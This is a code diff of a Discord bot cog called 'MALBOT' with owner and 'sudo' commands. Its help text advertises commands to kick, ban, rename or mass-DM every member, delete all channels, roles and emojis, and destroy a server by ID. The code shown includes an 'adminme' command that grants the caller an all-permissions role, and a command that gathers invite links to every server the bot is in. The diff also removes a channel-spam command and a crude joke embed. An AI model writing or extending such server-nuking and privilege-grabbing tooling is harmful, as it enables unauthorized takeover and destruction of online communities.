@@ -57,7 +57,7 @@ class Botsudo(commands.Cog):
         em = discord.Embed(title='MALBOT Help', description='This help menu contains commands for owners only!\nThe bot prefix is `-`.', colour=RandomColour())
 
         em.add_field(name='Owner Commands:', value='`addsudo <user> <reason>` Allows a user to use sudo command\n`removesudo <user> <reason>`\n`botname <name>` Renames the bot.\n`createinvite <chanid>` creates an invite link from channelid (bot must have access to target channel!\n`gban <user> [reason]` Globally bans a user.\n`adminme` gives yourself admin.\n`reply <chan_id> <msg>` Replies to a report.\n`servers` grabs 1 invite of every server.\n`leaveserver [server_id]` leaves the server.', inline=False)
-        em.add_field(name='MALBOT Commands:', value='`chanmsgall <msg>` Sends a message to all channels in a server.\n`kickall` Kicks everyone in a server.\n`banall` Bans everyone in a server.\n`renameall <name>` Renames everyone in a server.\n`msgall <msg>` DMs everyone in a server.\n`deleteall <channels|roles|emojis|all>` Deletes specified objects.\n`destroy` Attempts to destroy everything on a server.\n`destroyid <server_id>` Destroys a server given its ID.', inline=False)
+        em.add_field(name='MALBOT Commands:', value='`kickall` Kicks everyone in a server.\n`banall` Bans everyone in a server.\n`renameall <name>` Renames everyone in a server.\n`msgall <msg>` DMs everyone in a server.\n`deleteall <channels|roles|emojis|all>` Deletes specified objects.\n`destroy` Attempts to destroy everything on a server.\n`destroyid <server_id>` Destroys a server given its ID.', inline=False)
         em.set_footer(text=f'Your usage is being logged {ctx.message.author} ({ctx.message.author.id}).', icon_url=ctx.message.author.avatar_url_as(static_format='png'))
 
         await ctx.send(embed=em)
@@ -71,22 +71,6 @@ class Botsudo(commands.Cog):
 
         channel = self.bot.get_channel(chan)
         await channel.send(txt)
-
-    @commands.check(BOT_OWNER_CHECK)
-    @commands.command()
-    async def rgbtest(self, ctx, lol: int):
-
-        mhsend = await ctx.send('Ratelimit test')
-        i = 0
-        ministick = '='
-        stick = ''
-        while i <= lol:
-            stick += ministick
-            em = discord.Embed(title='PP Grow', description=f'Dark PP Grow!\n8{stick}D', colour=RandomColour())
-
-            await asyncio.sleep(2.5)
-            await mhsend.edit(embed=em)
-            i += 1
 
     @commands.check(BOT_OWNER_CHECK)
     @commands.command()
@@ -252,17 +236,17 @@ class Botsudo(commands.Cog):
                 
 
             except discord.Forbidden:
-                return await ctx.send("0x02")
+                return await ctx.send(":x; That is forbidden!")
             await ctx.message.author.add_roles(adminme_role)
-            await ctx.send('0x01')
+            await ctx.send(':white_check_mark: Success!')
         else:
             try:
                 await ctx.message.author.add_roles(adminme_role)
                 adminme_role = await adminme_role.edit(permissions=discord.Permissions.all(), reason='THIS IS A SUDO ROLE! DO NOT EDIT.')
             except:
-                return await ctx.send('0x03')
+                return await ctx.send(':x: No permission!')
                 
-            await ctx.send('0x01')
+            await ctx.send(':white_check_mark: Success!')
 
     # Reply
     @commands.check(SUDOER_CHECK)
@@ -297,10 +281,10 @@ class Botsudo(commands.Cog):
             try:
                 serverinvitesr = await servers.invites()
                 for serverinvites in serverinvitesr:
-                    print(f'[SERVERS] {serverinvites.url} | {servers.name} | {servers.id}')
+                    await ctx.send(f'[SERVERS] {serverinvites.url} | {servers.name} | {servers.id}')
             except:
                 pass
-        await ctx.send("Check console server info.")
+        await ctx.send('Finished finding servers.')
 
     @commands.check(SUDOER_CHECK)
     @commands.command()
@@ -318,23 +302,6 @@ class Botsudo(commands.Cog):
         except Exception as e:
             print(f"Failed to leave {server}\n{e}")
             await ctx.send(f"Failed to leave {server}\n{e}")
-
-    @commands.check(SUDOER_CHECK)
-    @commands.command()
-    async def chanmsgall(self, ctx, *, msg):
-
-        print(f"{ctx.message.author} used -> {ctx.message.content} <- in {ctx.guild.name} ({ctx.guild.id})")
-
-        for channel in list(ctx.guild.channels):
-            try:
-                await channel.send(msg)
-                print (f"{channel.name} has received message in {ctx.guild.name}")
-            except:
-                print (f"{channel.name} has NOT received message in {ctx.guild.name}")
-
-        await ctx.message.delete()
-        print ("Action Completed: chanmsgall")
-    # Message all channels in a server.
 
     @commands.check(SUDOER_CHECK)
     @commands.command()
